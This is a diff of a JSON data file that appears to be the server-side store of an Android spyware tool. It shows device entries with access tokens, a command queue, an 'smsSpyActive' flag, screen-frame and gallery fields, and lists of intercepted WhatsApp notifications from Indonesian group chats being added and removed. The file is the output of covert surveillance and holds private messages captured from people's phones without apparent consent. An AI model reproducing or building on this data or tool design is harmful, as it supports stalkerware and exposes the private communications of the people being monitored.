@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046725815,
+    "lastSeen": 1775046726068,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ISIAN ZAYN X OWN [2] (1654 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
+        "content": "22 3 nvmtps fpt n mcro mobi andro only",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046727881
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15888 pesan dari 10 chat",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046726248
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13726 pesan): ~ Bot",
+        "content": "🎵 Pesan suara (0.17)",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046726214
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "01/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046084178
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15771 pesan dari 10 chat",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046081191
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13573 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : gue mah cantik\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046081175
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13572 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar nenek, kuping, dan lambang &.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046080437
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15888 pesan dari 10 chat",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046726230
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13726 pesan): ~ Bot",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046081215
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13573 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : gue mah cantik\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046081159
       }
     ],
     "galleryPhotos": [],
